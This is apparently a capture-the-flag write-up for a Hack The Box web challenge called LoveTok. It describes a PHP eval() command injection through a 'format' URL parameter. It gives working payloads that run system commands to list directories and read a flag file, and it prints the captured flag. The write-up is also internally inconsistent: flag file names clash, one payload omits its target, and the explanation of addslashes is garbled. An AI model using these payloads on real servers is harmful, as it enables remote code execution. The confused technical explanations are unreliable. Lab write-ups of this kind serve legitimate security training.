# File Analysis

## TimeController.php

In the `TimeController.php` file of the LoveTok web application, the code snippet below is present:

```php
$format = isset($_GET['format']) ? $_GET['format'] : 'r';
$time = new TimeModel($format);
```
- This code takes a 'format' parameter from the URL and passes it to the TimeModel class.

## TimeModel.php Vulnerability

- The TimeModel.php file contains the following code:

```
class TimeModel {
    public function __construct($format) {
        // Values from $format are executed in the eval() function
        eval($format);
    }
}
```
- Here, the 'format' value is directly passed to eval(), making the code vulnerable to command injection.

## Command Injection Payload

- A command injection payload was successfully executed by passing the following URL:
```
http://178.62.11.21:30505/?format=r
```
- This payload changed the "Date and Time" on the website.

## File Listing Injection

- A file listing injection was attempted using the following payload:

```
http://178.62.11.21:30505/?format=$_{system($_GET[1])}&1=ls+/
```
- In this case, the parameter '1' was assigned the value 'ls', attempting to list all files on the webpage.

## Forward Slash Addition

- To execute the remote code value, a forward slash was added:

```
$this->format = addslashes($format);
```
## Finding the Flag

- To locate the flag, the following command injection was attempted:

```
http://178.62.11.21:30505/?format=$_{system($_GET[1])}&1=cat
```

- This injection aimed to read the contents of the 'flagBs3s' file.

- These findings highlight a command injection vulnerability in the LoveTok web application, allowing potential unauthorized access and manipulation of server-side functionalities. It is crucial to address and patch such vulnerabilities promptly to enhance the security of the application.

```
cat ../flagmRG8b
cat — get file
../flagmRG8b —The “flagmRG8b” file is located in the folder one level up from the current folder.
```

FLAG - HTB{wh3n_10v3_g3ts_eval3d_sh311s_st4rt_pOpp1ng}